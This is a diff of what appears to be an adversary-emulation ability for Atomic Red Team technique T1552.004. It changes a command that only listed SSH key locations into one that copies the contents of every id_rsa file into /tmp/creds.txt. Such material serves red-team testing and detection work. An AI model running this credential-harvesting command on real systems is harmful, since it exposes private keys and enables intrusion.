@@ -8,18 +8,18 @@
   platforms:
     linux:
       sh:
-        command: find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt; exit
-          0
-        cleanup: 'rm #{output_file}'
+        command: find / -name "id_rsa" -type f -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt;
+          cat "$1" >> /tmp/creds.txt' _ {} \; 2>/dev/null; exit 0
+        cleanup: rm -f /tmp/creds.txt
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
-  - credential-access
   - atomic-red-team
   - t1552.004
+  - credential-access
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -27,10 +27,15 @@
         description: Path where to start searching from.
         type: path
         default: /
-      output_file:
-        description: Output file containing locations of SSH key files
-        type: path
-        default: /tmp/keyfile_locations.txt
+      filename:
+        description: SSH Key file to search for
+        type: string
+        default: id_rsa
+      optional_flags:
+        description: optional flags passed into find that should be ran
+        type: string
+        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+          _ {} \;
     technique_created: '2020-02-04T13:06:49.258Z'
     atomic_guid: 46959285-906d-40fa-9437-5a439accd878
-    import_timestamp: '2026-09-04T06:56:25.594786Z'
+    import_timestamp: '2026-09-05T06:41:20.017808Z'
